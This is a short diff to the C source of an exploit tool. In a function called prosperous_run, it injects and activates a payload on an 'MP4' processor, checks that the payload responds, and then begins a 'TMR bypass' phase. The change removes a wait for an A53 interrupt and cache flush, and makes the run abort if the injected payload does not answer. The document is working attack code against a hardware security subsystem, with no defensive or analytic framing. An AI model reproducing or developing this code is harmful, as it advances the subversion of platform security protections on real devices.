@@ -220,22 +220,15 @@ int prosperous_run(void)
         printf("[!] MP4 payload injection failed: %d\n", ret);
         return ret;
     }
-    printf("[+] MP4 payload injected and armed\n");
+    printf("[+] MP4 payload injected and activated\n");
 
-    /* Wait for A53 to process the next IRQ and activate our hooks.
-     * The jmpbuf trigger fires IC IALLU (cache flush) on the next
-     * exception, making our patched code visible to the A53. */
-    printf("[*] Waiting for payload activation...\n");
-    usleep(500000);  /* 500ms — A53 handles periodic interrupts */
-
+    /* Verify MP4 payload is responding */
     ret = mp4_ping(&ctx);
     if (ret != 0) {
-        printf("[!] MP4 payload not responding after injection\n");
-        printf("[!] The A53 may not have processed an IRQ yet.\n");
-        printf("[*] Continuing anyway — TMR bypass may trigger it.\n");
-    } else {
-        printf("[+] MP4 payload alive and responding!\n");
+        printf("[!] MP4 payload not responding after activation\n");
+        return ret;
     }
+    printf("[+] MP4 payload alive and responding!\n");
 
     /* Phase 2: TMR bypass */
     printf("\n[*] Phase 2: TMR bypass...\n");
